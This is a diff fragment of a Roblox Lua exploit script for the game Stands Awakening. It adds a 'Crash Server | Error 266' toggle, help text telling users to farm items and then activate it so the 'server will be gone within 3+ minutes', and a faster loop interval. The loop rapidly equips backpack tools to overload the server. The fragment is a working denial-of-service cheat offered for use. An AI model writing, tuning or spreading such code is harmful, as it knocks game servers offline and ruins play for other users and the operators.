@@ -5769,10 +5769,21 @@ if game.PlaceId == Supported.Stands_Awakening then
         end
     end);
 
-    local FourthToggle = FourthPage.AddToggle("Error 266", false, function(Value)
+
+    local FourthLabel = FourthPage.AddLabel("[+] Hakai  💀");
+    local FourthButton = FourthPage.AddButton("How to use ⁉️ (Open f9 console)", function()
+        warn("---HOW TO USE---")
+        print("1. Goto 'Farming' Section.")
+        print("2. Turn on Rokakaka + Arrow Item farm.")
+        print("3. Wait (The most tools, The faster the crash.")
+        print("4. Come back here and activate 'Eror 266'")
+        print("5. Server will be gone within 3+ minutes")
+    end);
+
+    local FourthToggle = FourthPage.AddToggle("Crash Server | Error 266  💀", false, function(Value)
         getgenv().Hakai = Value
 
-        while getgenv().Hakai == true do wait(0.1);
+        while getgenv().Hakai == true do wait(0.015);
             for i,v in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
                 if v:IsA("Tool") then
                      v.Parent = game:GetService("Players").LocalPlayer.Character
